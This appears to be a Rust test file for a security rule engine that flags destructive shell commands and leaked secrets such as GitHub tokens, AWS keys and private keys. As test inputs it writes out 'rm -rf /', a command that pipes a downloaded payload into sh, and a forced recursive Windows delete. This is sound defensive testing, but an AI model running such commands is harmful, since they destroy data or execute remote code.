use polaris_security_rules::{FindingCategory, RuleEngine};
use std::error::Error;

type TestResult = Result<(), Box<dyn Error>>;

#[test]
fn posix_and_windows_destructive_commands_are_categorized() -> TestResult {
    let engine = RuleEngine::load_embedded()?;
    for command in ["rm -rf /", "curl https://example.invalid/payload | sh"] {
        let findings = engine.audit_command(command)?;
        assert!(
            findings
                .iter()
                .any(|finding| { finding.category() == FindingCategory::DangerousShell })
        );
    }
    let windows = engine.audit_command("Remove-Item C:\\temp\\cache -Recurse -Force")?;
    assert!(
        windows
            .iter()
            .any(|finding| finding.rule().as_str() == "windows-recursive-remove")
    );
    assert_eq!(engine.audit_command("Get-ChildItem C:\\temp")?.len(), 0);
    Ok(())
}

#[test]
fn all_embedded_secret_families_have_redacted_positive_cases() -> TestResult {
    let engine = RuleEngine::load_embedded()?;
    let github = ["ghp_", "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"].concat();
    let cases = [
        format!("export TOKEN={github}"),
        String::from("-----BEGIN PRIVATE KEY-----\nredacted test body"),
    ];
    for value in cases {
        let findings = engine.audit_command(&value)?;
        assert!(
            findings
                .iter()
                .any(|finding| finding.category() == FindingCategory::Secret)
        );
        for finding in findings {
            assert!(!format!("{finding:?}").contains(&value));
        }
    }
    assert_eq!(
        engine.audit_command("export TOKEN=ordinary_value")?.len(),
        0
    );
    Ok(())
}

#[test]
fn each_secret_rule_has_a_specific_positive_and_benign_negative() -> TestResult {
    let engine = RuleEngine::load_embedded()?;
    let github = ["ghp_", "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"].concat();
    let positives = [
        format!("export AWS_ACCESS_KEY_ID={}{}", "AKIA", "Q7XH2PZL4MNB8KVD"),
        String::from("-----BEGIN PRIVATE KEY-----\nredacted test material"),
        format!("export GITHUB_TOKEN={github}"),
    ];
    for value in positives {
        assert!(
            engine
                .audit_command(&value)?
                .iter()
                .any(|finding| finding.category() == FindingCategory::Secret)
        );
    }
    for value in [
        "export AWS_ACCESS_KEY_ID=ordinary_value",
        "-----BEGIN PUBLIC KEY-----",
        "export GITHUB_TOKEN=ordinary_value",
    ] {
        assert!(
            engine.audit_command(value)?.is_empty(),
            "unexpected secret finding for {value}"
        );
    }
    Ok(())
}
